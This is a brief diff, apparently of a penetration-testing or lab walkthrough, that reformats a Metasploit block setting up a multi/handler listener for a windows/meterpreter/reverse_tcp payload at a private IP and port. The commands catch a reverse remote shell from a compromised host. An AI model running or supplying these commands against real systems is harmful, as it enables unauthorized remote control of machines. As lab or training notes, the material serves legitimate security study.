@@ -223,7 +223,11 @@ run -j
 
 listen for meterpreter shell
 ```
-use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 10.4.9.144 set LPORT 1234 run
+use exploit/multi/handler 
+set PAYLOAD windows/meterpreter/reverse_tcp 
+set LHOST 10.4.9.144 
+set LPORT 1234 
+run -j
 ```
 
 upgrade shell
